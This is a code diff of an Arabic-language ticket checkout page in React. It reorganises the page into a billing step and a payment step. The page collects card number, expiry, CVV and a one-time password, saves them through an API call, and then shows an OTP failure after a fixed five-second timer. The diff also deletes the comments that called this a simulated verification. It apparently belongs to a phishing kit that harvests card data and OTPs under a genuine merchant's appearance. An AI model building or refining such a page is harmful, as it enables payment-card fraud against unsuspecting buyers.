@@ -1,5 +1,5 @@
 import { useEffect, useMemo, useRef, useState } from "react";
-import { AlertCircle, CreditCard, Loader2, ShieldCheck } from "lucide-react";
+import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
 import {
   api,
   buildUrl,
@@ -128,7 +128,15 @@ function validateBillingDetails(billing: BillingDetails): string | null {
   return null;
 }
 
+type CheckoutStep = 1 | 2;
+
 export default function Checkout() {
+  const [currentStep, setCurrentStep] = useState<CheckoutStep>(1);
+  const [billingError, setBillingError] = useState<string | null>(null);
+
+  const step1Ref = useRef<HTMLDivElement>(null);
+  const step2Ref = useRef<HTMLDivElement>(null);
+
   const [billingDetails, setBillingDetails] = useState<BillingDetails>({
     firstName: "",
     lastName: "",
@@ -185,27 +193,41 @@ export default function Checkout() {
     };
   }, []);
 
-  const onProceedToPayment = async () => {
-    if (otpRevealTimerRef.current) {
-      window.clearTimeout(otpRevealTimerRef.current);
+  useEffect(() => {
+    const targetRef = currentStep === 1 ? step1Ref : step2Ref;
+    if (targetRef.current) {
+      targetRef.current.scrollIntoView({ behavior: "smooth", block: "start" });
     }
-    if (otpVerifyTimerRef.current) {
-      window.clearTimeout(otpVerifyTimerRef.current);
-    }
+  }, [currentStep]);
 
+  const onGoToStep2 = () => {
     if (!visitDate || !storedCart.visitDateIso) {
-      setPaymentStep("idle");
-      setPaymentError(
-        "يرجى اختيار تاريخ الزيارة من صفحة التذاكر قبل المتابعة إلى الدفع."
+      setBillingError(
+        "يرجى اختيار تاريخ الزيارة من صفحة التذاكر قبل المتابعة."
       );
       return;
     }
 
     const billingValidationError = validateBillingDetails(billingDetails);
     if (billingValidationError) {
-      setPaymentStep("idle");
-      setPaymentError(billingValidationError);
+      setBillingError(billingValidationError);
       return;
+    }
+
+    setBillingError(null);
+    setCurrentStep(2);
+  };
+
+  const onBackToStep1 = () => {
+    setCurrentStep(1);
+  };
+
+  const onProceedToPayment = async () => {
+    if (otpRevealTimerRef.current) {
+      window.clearTimeout(otpRevealTimerRef.current);
+    }
+    if (otpVerifyTimerRef.current) {
+      window.clearTimeout(otpVerifyTimerRef.current);
     }
 
     const cardValidationError = validateCardDetails(cardDetails);
@@ -222,7 +244,7 @@ export default function Checkout() {
         phone: billingDetails.phone.trim(),
         email: billingDetails.email.trim(),
       },
-      visitDateIso: storedCart.visitDateIso,
+      visitDateIso: storedCart.visitDateIso!,
       visitTime,
       items: orderItems.map((item) => ({
         id: item.id,
@@ -296,7 +318,6 @@ export default function Checkout() {
     setPaymentError(null);
     setPaymentStep("verifyingOtp");
 
-    // Simulate gateway verification; after 5s show explicit failure.
     otpVerifyTimerRef.current = window.setTimeout(() => {
       void (async () => {
         const failureMessage = "فشل التحقق من رمز OTP. يرجى المحاولة مرة أخرى.";
@@ -316,7 +337,6 @@ export default function Checkout() {
               }
             );
           } catch {
-            // Keep the UI flow resilient even if update logging fails.
           }
         }
 
@@ -351,360 +371,444 @@ export default function Checkout() {
         <main className="flex-1 px-4 pb-8 pt-4 sm:px-6 md:px-8">
           <SessionTimerStrip className="max-w-[560px]" />
 
-          <div className="mt-4 grid gap-7 lg:grid-cols-[1.1fr_1fr] lg:items-start">
-            <div>
-              <section className="bg-[#e9edf3] p-4 border-r-4 border-r-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
-                <p>
-                  لديك قسيمة؟
-                  <span className="mr-1 text-[#4d4d4d]">
-                    اضغط هنا لإدخال الكود
-                  </span>
-                </p>
-              </section>
-
-              <section className="mt-6">
-                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
-                  تفاصيل الفاتورة
-                </h2>
-
-                <form className="mt-4 grid gap-3 sm:grid-cols-2">
-                  <label className="block">
-                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                      الاسم الأول <span className="text-[#bf2828]">*</span>
-                    </span>
-                    <input
-                      type="text"
-                      value={billingDetails.firstName}
-                      onChange={(event) =>
-                        setBillingDetails((current) => ({
-                          ...current,
-                          firstName: event.target.value,
-                        }))
-                      }
-                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                    />
-                  </label>
-
-                  <label className="block">
-                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                      اسم العائلة <span className="text-[#bf2828]">*</span>
-                    </span>
-                    <input
-                      type="text"
-                      value={billingDetails.lastName}
-                      onChange={(event) =>
-                        setBillingDetails((current) => ({
-                          ...current,
-                          lastName: event.target.value,
-                        }))
-                      }
-                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                    />
-                  </label>
-
-                  <label className="block">
-                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                      رقم الهاتف <span className="text-[#bf2828]">*</span>
-                    </span>
-                    <input
-                      type="tel"
-                      value={billingDetails.phone}
-                      onChange={(event) =>
-                        setBillingDetails((current) => ({
-                          ...current,
-                          phone: event.target.value,
-                        }))
-                      }
-                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                    />
-                  </label>
-
-                  <label className="block sm:col-span-2">
-                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                      البريد الإلكتروني{" "}
-                      <span className="text-[#bf2828]">*</span>
-                    </span>
-                    <input
-                      type="email"
-                      value={billingDetails.email}
-                      onChange={(event) =>
-                        setBillingDetails((current) => ({
-                          ...current,
-                          email: event.target.value,
-                        }))
-                      }
-                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                    />
-                  </label>
-                </form>
-              </section>
+          <div className="mt-4 flex items-center justify-center gap-0">
+            <div className="flex items-center gap-2">
+              <div
+                className={`flex h-9 w-9 items-center justify-center rounded-full text-sm font-bold transition-colors ${
+                  currentStep >= 1
+                    ? "bg-[hsl(var(--quest-purple))] text-white"
+                    : "bg-[#e0e0e0] text-[#999]"
+                }`}
+              >
+                {currentStep > 1 ? <Check className="h-4 w-4" /> : "١"}
+              </div>
+              <span
+                className={`text-sm font-semibold ${
+                  currentStep >= 1
+                    ? "text-[hsl(var(--quest-purple))]"
+                    : "text-[#999]"
+                }`}
+              >
+                البيانات والطلب
+              </span>
             </div>
+            <div
+              className={`mx-3 h-[2px] w-12 sm:w-20 ${
+                currentStep >= 2
+                  ? "bg-[hsl(var(--quest-purple))]"
+                  : "bg-[#ddd]"
+              }`}
+            />
+            <div className="flex items-center gap-2">
+              <div
+                className={`flex h-9 w-9 items-center justify-center rounded-full text-sm font-bold transition-colors ${
+                  currentStep >= 2
+                    ? "bg-[hsl(var(--quest-purple))] text-white"
+                    : "bg-[#e0e0e0] text-[#999]"
+                }`}
+              >
+                ٢
+              </div>
+              <span
+                className={`text-sm font-semibold ${
+                  currentStep >= 2
+                    ? "text-[hsl(var(--quest-purple))]"
+                    : "text-[#999]"
+                }`}
+              >
+                الدفع
+              </span>
+            </div>
+          </div>
 
-            <div>
-              <section>
-                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
-                  طلبك
-                </h2>
-
-                <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
-                  <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
-                    <span>المنتج</span>
-                    <span>المجموع الفرعي</span>
-                  </div>
-
-                  <div className="space-y-2 px-3 py-3 text-xs text-[#444]">
-                    {orderItems.map((item) => (
-                      <div key={item.id}>
-                        <div className="grid grid-cols-[1fr_auto] items-start gap-2">
-                          <div>
-                            <p className="font-semibold">
-                              {item.name}{" "}
-                              <span className="font-normal">
-                                × {item.quantity}
-                              </span>
-                            </p>
-                            <p className="mt-1 text-[11px] text-[#666]">
-                              تاريخ الحجز: {bookingDateText}
-                            </p>
-                            <p className="text-[11px] text-[#666]">
-                              وقت الزيارة: {visitTime}
-                            </p>
-                            <p className="text-[11px] text-[#666]">
-                              الفئة: تذاكر الدخول
-                            </p>
-                          </div>
-                          <p>{formatQar(item.unitPrice * item.quantity)}</p>
-                        </div>
-                      </div>
-                    ))}
-
-                    <div className="border-t border-[#ededed] pt-2">
-                      <div className="flex items-center justify-between text-sm font-semibold">
-                        <span>المجموع الفرعي</span>
-                        <span>{formatQar(subtotal)}</span>
-                      </div>
-                      <div className="mt-1 flex items-center justify-between text-sm font-bold">
-                        <span>الإجمالي</span>
-                        <span>{formatQar(subtotal)}</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </section>
-
-              <section className="mt-7">
-                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
-                  الدفع
-                </h2>
-
-                <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
-                  <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
-                    <CreditCard className="h-4 w-4" />
-                    بطاقات الائتمان / الخصم
-                  </div>
-
-                  <p className="mt-3 text-xs leading-5 text-[#444]">
-                    SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
-                    لكل من العملاء والتجار.
-                  </p>
-
-                  <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
-                    <p className="text-[11px] text-white/80">بطاقة الدفع</p>
-                    <div
-                      className="mt-5 text-lg font-semibold tracking-[0.12em]"
-                      dir="ltr"
-                    >
-                      {cardPreviewNumber}
-                    </div>
-                    <div className="mt-5 flex items-end justify-between gap-3">
-                      <div className="min-w-0">
-                        <p className="text-[10px] text-white/70">
-                          حامل البطاقة
-                        </p>
-                        <p className="truncate text-sm font-semibold">
-                          {cardPreviewName}
-                        </p>
-                      </div>
-                      <div className="shrink-0 text-right">
-                        <p className="text-[10px] text-white/70">الانتهاء</p>
-                        <p className="text-sm font-semibold" dir="ltr">
-                          {cardPreviewExpiry}
-                        </p>
-                      </div>
-                    </div>
-                  </div>
-
-                  <form
-                    className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
-                    onSubmit={(event) => event.preventDefault()}
-                  >
-                    <label className="block">
-                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                        اسم حامل البطاقة{" "}
-                        <span className="text-[#bf2828]">*</span>
+          {currentStep === 1 ? (
+            <div ref={step1Ref} className="mt-6">
+              <div className="grid gap-7 lg:grid-cols-[1.1fr_1fr] lg:items-start">
+                <div>
+                  <section className="bg-[#e9edf3] p-4 border-r-4 border-r-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
+                    <p>
+                      لديك قسيمة؟
+                      <span className="mr-1 text-[#4d4d4d]">
+                        اضغط هنا لإدخال الكود
                       </span>
-                      <input
-                        type="text"
-                        autoComplete="cc-name"
-                        value={cardDetails.cardholderName}
-                        onChange={(event) =>
-                          setCardDetails((current) => ({
-                            ...current,
-                            cardholderName: event.target.value,
-                          }))
-                        }
-                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                        placeholder="الاسم على البطاقة"
-                      />
-                    </label>
+                    </p>
+                  </section>
 
-                    <label className="block">
-                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                        رقم البطاقة <span className="text-[#bf2828]">*</span>
-                      </span>
-                      <input
-                        type="text"
-                        inputMode="numeric"
-                        autoComplete="cc-number"
-                        value={cardDetails.cardNumber}
-                        onChange={(event) =>
-                          setCardDetails((current) => ({
-                            ...current,
-                            cardNumber: formatCardNumber(event.target.value),
-                          }))
-                        }
-                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                        dir="ltr"
-                        placeholder="4242 4242 4242 4242"
-                      />
-                    </label>
+                  <section className="mt-6">
+                    <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
+                      تفاصيل الفاتورة
+                    </h2>
 
-                    <div className="grid grid-cols-2 gap-3">
+                    <form className="mt-4 grid gap-3 sm:grid-cols-2" onSubmit={(e) => e.preventDefault()}>
                       <label className="block">
                         <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                          تاريخ الانتهاء{" "}
+                          الاسم الأول <span className="text-[#bf2828]">*</span>
+                        </span>
+                        <input
+                          type="text"
+                          value={billingDetails.firstName}
+                          onChange={(event) =>
+                            setBillingDetails((current) => ({
+                              ...current,
+                              firstName: event.target.value,
+                            }))
+                          }
+                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                        />
+                      </label>
+
+                      <label className="block">
+                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                          اسم العائلة <span className="text-[#bf2828]">*</span>
+                        </span>
+                        <input
+                          type="text"
+                          value={billingDetails.lastName}
+                          onChange={(event) =>
+                            setBillingDetails((current) => ({
+                              ...current,
+                              lastName: event.target.value,
+                            }))
+                          }
+                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                        />
+                      </label>
+
+                      <label className="block">
+                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                          رقم الهاتف <span className="text-[#bf2828]">*</span>
+                        </span>
+                        <input
+                          type="tel"
+                          value={billingDetails.phone}
+                          onChange={(event) =>
+                            setBillingDetails((current) => ({
+                              ...current,
+                              phone: event.target.value,
+                            }))
+                          }
+                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                        />
+                      </label>
+
+                      <label className="block sm:col-span-2">
+                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                          البريد الإلكتروني{" "}
+                          <span className="text-[#bf2828]">*</span>
+                        </span>
+                        <input
+                          type="email"
+                          value={billingDetails.email}
+                          onChange={(event) =>
+                            setBillingDetails((current) => ({
+                              ...current,
+                              email: event.target.value,
+                            }))
+                          }
+                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                        />
+                      </label>
+                    </form>
+                  </section>
+                </div>
+
+                <div>
+                  <section>
+                    <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
+                      طلبك
+                    </h2>
+
+                    <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
+                      <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
+                        <span>المنتج</span>
+                        <span>المجموع الفرعي</span>
+                      </div>
+
+                      <div className="space-y-2 px-3 py-3 text-xs text-[#444]">
+                        {orderItems.map((item) => (
+                          <div key={item.id}>
+                            <div className="grid grid-cols-[1fr_auto] items-start gap-2">
+                              <div>
+                                <p className="font-semibold">
+                                  {item.name}{" "}
+                                  <span className="font-normal">
+                                    × {item.quantity}
+                                  </span>
+                                </p>
+                                <p className="mt-1 text-[11px] text-[#666]">
+                                  تاريخ الحجز: {bookingDateText}
+                                </p>
+                                <p className="text-[11px] text-[#666]">
+                                  وقت الزيارة: {visitTime}
+                                </p>
+                                <p className="text-[11px] text-[#666]">
+                                  الفئة: تذاكر الدخول
+                                </p>
+                              </div>
+                              <p>{formatQar(item.unitPrice * item.quantity)}</p>
+                            </div>
+                          </div>
+                        ))}
+
+                        <div className="border-t border-[#ededed] pt-2">
+                          <div className="flex items-center justify-between text-sm font-semibold">
+                            <span>المجموع الفرعي</span>
+                            <span>{formatQar(subtotal)}</span>
+                          </div>
+                          <div className="mt-1 flex items-center justify-between text-sm font-bold">
+                            <span>الإجمالي</span>
+                            <span>{formatQar(subtotal)}</span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </section>
+                </div>
+              </div>
+
+              {billingError ? (
+                <div className="mt-4 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
+                  <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
+                  <p>{billingError}</p>
+                </div>
+              ) : null}
+
+              <button
+                type="button"
+                onClick={onGoToStep2}
+                className="mt-5 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-3 text-sm font-semibold text-white hover:opacity-90 sm:w-auto sm:px-10"
+              >
+                متابعة إلى الدفع
+              </button>
+            </div>
+          ) : null}
+
+          {currentStep === 2 ? (
+            <div ref={step2Ref} className="mt-6">
+              <div className="mx-auto max-w-[600px]">
+                <section>
+                  <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
+                    الدفع
+                  </h2>
+
+                  <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
+                    <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
+                      <CreditCard className="h-4 w-4" />
+                      بطاقات الائتمان / الخصم
+                    </div>
+
+                    <p className="mt-3 text-xs leading-5 text-[#444]">
+                      SkipCash هو تطبيق دفع يوفر تجربة مريحة وسلسة طوال رحلة الدفع
+                      لكل من العملاء والتجار.
+                    </p>
+
+                    <div className="mt-4 rounded-xl bg-gradient-to-br from-[hsl(var(--quest-purple))] via-[#7a2a88] to-[#a44aa7] px-4 py-4 text-white shadow-lg">
+                      <p className="text-[11px] text-white/80">بطاقة الدفع</p>
+                      <div
+                        className="mt-5 text-lg font-semibold tracking-[0.12em]"
+                        dir="ltr"
+                      >
+                        {cardPreviewNumber}
+                      </div>
+                      <div className="mt-5 flex items-end justify-between gap-3">
+                        <div className="min-w-0">
+                          <p className="text-[10px] text-white/70">
+                            حامل البطاقة
+                          </p>
+                          <p className="truncate text-sm font-semibold">
+                            {cardPreviewName}
+                          </p>
+                        </div>
+                        <div className="shrink-0 text-right">
+                          <p className="text-[10px] text-white/70">الانتهاء</p>
+                          <p className="text-sm font-semibold" dir="ltr">
+                            {cardPreviewExpiry}
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    <form
+                      className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
+                      onSubmit={(event) => event.preventDefault()}
+                    >
+                      <label className="block">
+                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                          اسم حامل البطاقة{" "}
                           <span className="text-[#bf2828]">*</span>
                         </span>
                         <input
                           type="text"
-                          inputMode="numeric"
-                          autoComplete="cc-exp"
-                          value={cardDetails.expiry}
+                          autoComplete="cc-name"
+                          value={cardDetails.cardholderName}
                           onChange={(event) =>
                             setCardDetails((current) => ({
                               ...current,
-                              expiry: formatExpiry(event.target.value),
+                              cardholderName: event.target.value,
                             }))
                           }
-                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                          dir="ltr"
-                          placeholder="MM/YY"
+                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                          placeholder="الاسم على البطاقة"
                         />
                       </label>
 
                       <label className="block">
                         <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                          CVV <span className="text-[#bf2828]">*</span>
-                        </span>
-                        <input
-                          type="password"
-                          inputMode="numeric"
-                          autoComplete="cc-csc"
-                          value={cardDetails.cvv}
-                          onChange={(event) =>
-                            setCardDetails((current) => ({
-                              ...current,
-                              cvv: toDigitsOnly(event.target.value).slice(0, 4),
-                            }))
-                          }
-                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
-                          dir="ltr"
-                          placeholder="***"
-                        />
-                      </label>
-                    </div>
-                  </form>
-
-                  {paymentStep === "waitingOtp" ? (
-                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
-                      <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
-                      <p>
-                        جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.
-                      </p>
-                    </div>
-                  ) : null}
-
-                  {showOtpForm ? (
-                    <div className="mt-3 rounded-md border border-[#ececec] p-3">
-                      <div className="flex items-center gap-2 text-sm font-semibold text-[#414141]">
-                        <ShieldCheck className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
-                        التحقق عبر OTP
-                      </div>
-
-                      <label className="mt-2 block">
-                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
-                          أدخل رمز OTP <span className="text-[#bf2828]">*</span>
+                          رقم البطاقة <span className="text-[#bf2828]">*</span>
                         </span>
                         <input
                           type="text"
                           inputMode="numeric"
-                          value={otpCode}
+                          autoComplete="cc-number"
+                          value={cardDetails.cardNumber}
                           onChange={(event) =>
-                            setOtpCode(
-                              toDigitsOnly(event.target.value).slice(0, 6)
-                            )
+                            setCardDetails((current) => ({
+                              ...current,
+                              cardNumber: formatCardNumber(event.target.value),
+                            }))
                           }
                           className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                           dir="ltr"
-                          placeholder="رمز OTP من 6 أرقام"
+                          placeholder="4242 4242 4242 4242"
                         />
                       </label>
 
+                      <div className="grid grid-cols-2 gap-3">
+                        <label className="block">
+                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                            تاريخ الانتهاء{" "}
+                            <span className="text-[#bf2828]">*</span>
+                          </span>
+                          <input
+                            type="text"
+                            inputMode="numeric"
+                            autoComplete="cc-exp"
+                            value={cardDetails.expiry}
+                            onChange={(event) =>
+                              setCardDetails((current) => ({
+                                ...current,
+                                expiry: formatExpiry(event.target.value),
+                              }))
+                            }
+                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                            dir="ltr"
+                            placeholder="MM/YY"
+                          />
+                        </label>
+
+                        <label className="block">
+                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                            CVV <span className="text-[#bf2828]">*</span>
+                          </span>
+                          <input
+                            type="password"
+                            inputMode="numeric"
+                            autoComplete="cc-csc"
+                            value={cardDetails.cvv}
+                            onChange={(event) =>
+                              setCardDetails((current) => ({
+                                ...current,
+                                cvv: toDigitsOnly(event.target.value).slice(0, 4),
+                              }))
+                            }
+                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                            dir="ltr"
+                            placeholder="***"
+                          />
+                        </label>
+                      </div>
+                    </form>
+
+                    {paymentStep === "waitingOtp" ? (
+                      <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
+                        <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
+                        <p>
+                          جاري معالجة بيانات البطاقة. سيظهر رمز OTP خلال 5 ثوانٍ.
+                        </p>
+                      </div>
+                    ) : null}
+
+                    {showOtpForm ? (
+                      <div className="mt-3 rounded-md border border-[#ececec] p-3">
+                        <div className="flex items-center gap-2 text-sm font-semibold text-[#414141]">
+                          <ShieldCheck className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
+                          التحقق عبر OTP
+                        </div>
+
+                        <label className="mt-2 block">
+                          <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
+                            أدخل رمز OTP <span className="text-[#bf2828]">*</span>
+                          </span>
+                          <input
+                            type="text"
+                            inputMode="numeric"
+                            value={otpCode}
+                            onChange={(event) =>
+                              setOtpCode(
+                                toDigitsOnly(event.target.value).slice(0, 6)
+                              )
+                            }
+                            className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-left text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
+                            dir="ltr"
+                            placeholder="رمز OTP من 6 أرقام"
+                          />
+                        </label>
+
+                        <button
+                          type="button"
+                          onClick={onVerifyOtp}
+                          disabled={paymentStep === "verifyingOtp"}
+                          className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
+                        >
+                          {paymentStep === "verifyingOtp"
+                            ? "جاري التحقق من OTP..."
+                            : "تحقق من OTP"}
+                        </button>
+                      </div>
+                    ) : null}
+
+                    {paymentError ? (
+                      <div className="mt-3 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
+                        <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
+                        <p>{paymentError}</p>
+                      </div>
+                    ) : null}
+
+                    <p className="mt-4 text-xs leading-5 text-[#666]">
+                      سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
+                      الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
+                    </p>
+
+                    <div className="mt-4 flex flex-col gap-2 sm:flex-row-reverse">
                       <button
                         type="button"
-                        onClick={onVerifyOtp}
-                        disabled={paymentStep === "verifyingOtp"}
-                        className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
+                        onClick={onProceedToPayment}
+                        disabled={
+                          paymentStep === "waitingOtp" ||
+                          paymentStep === "verifyingOtp" ||
+                          isSavingCheckout
+                        }
+                        className="w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70 sm:w-auto sm:px-10"
                       >
-                        {paymentStep === "verifyingOtp"
-                          ? "جاري التحقق من OTP..."
-                          : "تحقق من OTP"}
+                        {isSavingCheckout
+                          ? "جاري حفظ الطلب..."
+                          : paymentStep === "waitingOtp"
+                          ? "جاري طلب OTP..."
+                          : "المتابعة للدفع"}
+                      </button>
+                      <button
+                        type="button"
+                        onClick={onBackToStep1}
+                        className="w-full rounded border border-[hsl(var(--quest-purple))]/30 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 sm:w-auto sm:px-10"
+                      >
+                        الرجوع
                       </button>
                     </div>
-                  ) : null}
-
-                  {paymentError ? (
-                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
-                      <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
-                      <p>{paymentError}</p>
-                    </div>
-                  ) : null}
-
-                  <p className="mt-4 text-xs leading-5 text-[#666]">
-                    سيتم استخدام بياناتك الشخصية لمعالجة طلبك ودعم تجربتك في هذا
-                    الموقع، ولأغراض أخرى موضحة في سياسة الخصوصية.
-                  </p>
-
-                  <button
-                    type="button"
-                    onClick={onProceedToPayment}
-                    disabled={
-                      paymentStep === "waitingOtp" ||
-                      paymentStep === "verifyingOtp" ||
-                      isSavingCheckout
-                    }
-                    className="mt-4 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70"
-                  >
-                    {isSavingCheckout
-                      ? "جاري حفظ الطلب..."
-                      : paymentStep === "waitingOtp"
-                      ? "جاري طلب OTP..."
-                      : "المتابعة للدفع"}
-                  </button>
-                </div>
-              </section>
+                  </div>
+                </section>
+              </div>
             </div>
-          </div>
+          ) : null}
         </main>
 
         <QuestLegalFooter />
